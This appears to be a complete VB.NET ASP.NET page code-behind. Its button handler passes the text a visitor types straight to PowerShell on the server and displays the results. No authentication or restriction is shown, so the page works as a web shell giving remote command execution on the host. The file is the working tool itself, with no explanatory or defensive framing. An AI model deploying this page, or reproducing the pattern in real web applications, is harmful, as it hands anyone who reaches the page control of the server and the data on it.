Imports System
Imports System.Collections.Generic
Imports System.Linq
Imports System.Web
Imports System.Web.UI
Imports System.Web.UI.WebControls
Imports System.Management.Automation
Imports System.Text

Partial Class _Default
    Inherits System.Web.UI.Page

    Protected Sub btnExecuteCode_Click(sender As Object, e As EventArgs) Handles btnExecuteCode.Click
        tbResultBox.Text = ""
        Dim pshell = PowerShell.Create()

        pshell.Commands.AddScript(tbInput.Text)
        Dim psResults = pshell.Invoke()

        If (psResults.Count > 0) Then
            Dim psbuilder = New StringBuilder()

            For Each psObject In psResults
                psbuilder.Append(psObject.BaseObject.ToString() & vbCrLf)
            Next
            tbResultBox.Text = Server.HtmlEncode(psbuilder.ToString())
        End If

    End Sub
End Class
